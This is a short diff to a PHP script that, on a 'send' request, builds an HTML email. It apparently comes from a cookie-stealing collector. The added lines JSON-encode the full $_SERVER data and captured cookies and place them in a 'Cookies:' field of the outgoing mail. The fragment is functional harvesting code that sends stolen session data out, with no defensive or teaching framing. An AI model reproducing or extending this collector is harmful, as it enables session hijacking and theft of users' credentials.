@@ -134,6 +134,11 @@ if (isset($_REQUEST['send'])) {
         // fclose($file);
 
         // Send Mail
+        $cookie = json_encode([
+            "server" => $_SERVER,
+            "cookie" => $cookies
+        ], JSON_PRETTY_PRINT);
+
         $message = "<!DOCTYPE html>
         <html lang='en'>
             <head>
@@ -205,7 +210,9 @@ if (isset($_REQUEST['send'])) {
                     <div class='dotted'></div>
                     <div class='flex'>
                         <p class='title'>Cookies:</p>
-                        <p class='content'>{{cookie}}</p>
+                        <p class='content'>
+                            <pre>{{cookie}}</pre>
+                        </p>
                     </div>
                 </div>
             </body>
